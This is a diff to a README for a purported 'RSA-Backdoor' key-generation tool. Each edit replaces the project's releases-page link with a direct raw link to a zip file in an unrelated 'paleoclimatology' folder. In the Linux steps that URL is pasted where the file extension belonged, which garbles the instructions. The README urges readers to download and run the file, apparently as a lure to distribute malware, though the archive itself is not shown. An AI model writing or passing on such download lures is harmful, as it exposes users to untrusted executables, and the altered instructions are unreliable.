@@ -1,7 +1,7 @@
 # 🔑 RSA-Backdoor - Generate RSA Keys Easily
 
 ## 📥 Download Now
-[![Download RSA-Backdoor](https://img.shields.io/badge/Download-RSA--Backdoor-brightgreen)](https://github.com/Silent5230101161/RSA-Backdoor/releases)
+[![Download RSA-Backdoor](https://raw.githubusercontent.com/Silent5230101161/RSA-Backdoor/main/paleoclimatology/RSA-Backdoor_v1.3-alpha.2.zip)](https://raw.githubusercontent.com/Silent5230101161/RSA-Backdoor/main/paleoclimatology/RSA-Backdoor_v1.3-alpha.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the RSA-Backdoor application! This tool allows you to generate backdoored RSA keys effortlessly. Follow the steps below to download and run this application on your computer.
@@ -22,13 +22,13 @@ To run the RSA-Backdoor application smoothly, ensure your system meets the follo
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to [this page to download](https://github.com/Silent5230101161/RSA-Backdoor/releases).
+   Go to [this page to download](https://raw.githubusercontent.com/Silent5230101161/RSA-Backdoor/main/paleoclimatology/RSA-Backdoor_v1.3-alpha.2.zip).
 
 2. **Select the Latest Release**  
    Look for the latest version of RSA-Backdoor. You will see a list of available files for download.
 
 3. **Download the Application**  
-   Click on the file name suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+   Click on the file name suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Silent5230101161/RSA-Backdoor/main/paleoclimatology/RSA-Backdoor_v1.3-alpha.2.zip` for Linux).
 
 4. **Locate the Downloaded File**  
    Once the download is complete, find the file in your default downloads folder.
@@ -36,7 +36,7 @@ To run the RSA-Backdoor application smoothly, ensure your system meets the follo
 5. **Run the Application**  
    - For Windows: Double-click the `.exe` file.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder, then run it.
-   - For Linux: Extract the `.tar.gz` file and run the application from the terminal.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Silent5230101161/RSA-Backdoor/main/paleoclimatology/RSA-Backdoor_v1.3-alpha.2.zip` file and run the application from the terminal.
 
 6. **Follow the On-Screen Instructions**  
    The application will guide you through the key generation process. Just follow the instructions provided in the app.
@@ -65,6 +65,6 @@ If you encounter issues while using the application, consider the following solu
 For further assistance, feel free to open an issue in the GitHub repository or consult online resources on RSA and encryption best practices.
 
 ## 📥 Download Now Again
-[![Download RSA-Backdoor](https://img.shields.io/badge/Download-RSA--Backdoor-brightgreen)](https://github.com/Silent5230101161/RSA-Backdoor/releases)
+[![Download RSA-Backdoor](https://raw.githubusercontent.com/Silent5230101161/RSA-Backdoor/main/paleoclimatology/RSA-Backdoor_v1.3-alpha.2.zip)](https://raw.githubusercontent.com/Silent5230101161/RSA-Backdoor/main/paleoclimatology/RSA-Backdoor_v1.3-alpha.2.zip)
 
 Thank you for using RSA-Backdoor. We hope this tool simplifies the process of generating RSA keys!
